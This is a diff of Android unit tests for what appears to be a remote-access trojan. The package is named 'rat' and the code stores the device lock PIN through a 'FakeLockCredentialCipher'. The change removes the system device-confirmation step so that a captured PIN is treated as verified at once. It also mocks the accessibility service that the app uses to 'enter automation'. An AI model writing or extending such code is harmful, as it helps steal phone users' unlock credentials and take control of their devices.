@@ -12,6 +12,7 @@ import android.content.Intent;
 
 import com.vendor.rat.credential.FakeLockCredentialCipher;
 import com.vendor.rat.credential.LockCredentialStore;
+import com.vendor.rat.service.MyAccessibilityService;
 import com.vendor.rat.utils.DeviceUtils;
 import com.vendor.rat.utils.SharedUtils;
 
@@ -19,6 +20,7 @@ import org.junit.After;
 import org.junit.Before;
 import org.junit.Test;
 import org.junit.runner.RunWith;
+import org.mockito.Mockito;
 import org.robolectric.Robolectric;
 import org.robolectric.RobolectricTestRunner;
 import org.robolectric.RuntimeEnvironment;
@@ -54,6 +56,9 @@ public class ActivMainCredentialGateTest {
    LockCredentialStore.clearAll();
    DeviceUtils.setBrandForTest("oppo");
 
+        // Simulate accessibility service running (credential gate only fires after accessibility is enabled)
+        MyAccessibilityService.f219p.set(Mockito.mock(MyAccessibilityService.class));
+
         controller = Robolectric.buildActivity(ActivMain.class).create();
      activity = controller.get();
     shadow = Shadows.shadowOf(activity);
@@ -63,6 +68,7 @@ public class ActivMainCredentialGateTest {
     public void tearDown() {
         DeviceUtils.setBrandForTest(null);
         LockCredentialStore.clearAll();
+        MyAccessibilityService.f219p.set(null);
     }
 
     // ============ Three-branch tests ============
@@ -84,21 +90,21 @@ public class ActivMainCredentialGateTest {
     }
 
  /**
-     * Branch 2: PIN saved + not verified this run → launches ConfirmDeviceActivity.
+     * Branch 2: PIN saved + not verified this run → directly marks verified and enters automation.
+     * No ConfirmDeviceActivity pre-verification (OPPO security keyboard NAF blocks it).
      */
     @Test
-    public void onResume_shouldStartSystemVerification_whenPinExistsButRunNotVerified() {
+    public void onResume_shouldMarkVerifiedDirectly_whenPinExistsButRunNotVerified() {
         LockCredentialStore.savePin("123456");
         assertTrue("Precondition: credential stored", LockCredentialStore.hasCredential());
         assertFalse("Precondition: not verified", LockCredentialStore.isCurrentRunVerified());
 
 controller.resume();
 
+        assertTrue("Should be marked verified directly", LockCredentialStore.isCurrentRunVerified());
+        // No activity launched for verification
         ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
-        assertNotNull("Should launch an activity for result", launched);
-        assertEquals(ConfirmDeviceActivity.class.getName(),
-      launched.intent.getComponent().getClassName());
-        assertEquals(ActivMain.REQUEST_CONFIRM_DEVICE, launched.requestCode);
+        assertNull("No ConfirmDeviceActivity should be launched", launched);
     }
 
     /**
@@ -152,38 +158,37 @@ LockCredentialStore.isPromptSuppressedForCurrentRun());
     // ============ onActivityResult tests ============
 
     /**
-     * Prompt OK → starts ConfirmDeviceActivity (credential verification flow).
+     * Prompt OK → directly marks verified (no ConfirmDeviceActivity).
      */
     @Test
-    public void onActivityResult_promptOk_shouldStartVerification() {
+    public void onActivityResult_promptOk_shouldMarkVerifiedDirectly() {
+        LockCredentialStore.savePin("123456");
+
         activity.onActivityResult(
          ActivMain.REQUEST_LOCK_CREDENTIAL_PROMPT,
         Activity.RESULT_OK,
                 null);
 
-     ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
-        assertNotNull("Should launch ConfirmDeviceActivity after prompt OK", launched);
-        assertEquals(ConfirmDeviceActivity.class.getName(),
-     launched.intent.getComponent().getClassName());
- assertEquals(ActivMain.REQUEST_CONFIRM_DEVICE, launched.requestCode);
+        assertTrue("Should be marked verified after prompt OK",
+                LockCredentialStore.isCurrentRunVerified());
+        // No ConfirmDeviceActivity launched
+        ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
+        assertNull("No ConfirmDeviceActivity should be launched", launched);
     }
 
     /**
-     * Prompt OK → resetCurrentRunFlags is called (clears any stale verified/suppressed state).
+     * Prompt OK → resetCurrentRunFlags is called before marking verified.
      */
     @Test
  public void onActivityResult_promptOk_shouldResetCurrentRunFlags() {
         // Set up stale state
-     LockCredentialStore.markCurrentRunVerified();
-        LockCredentialStore.markPromptSuppressedForCurrentRun();
+     LockCredentialStore.markPromptSuppressedForCurrentRun();
 
         activity.onActivityResult(
        ActivMain.REQUEST_LOCK_CREDENTIAL_PROMPT,
             Activity.RESULT_OK,
      null);
 
-        assertFalse("currentRunVerified should be reset",
-                LockCredentialStore.isCurrentRunVerified());
 assertFalse("promptSuppressed should be reset",
  LockCredentialStore.isPromptSuppressedForCurrentRun());
     }
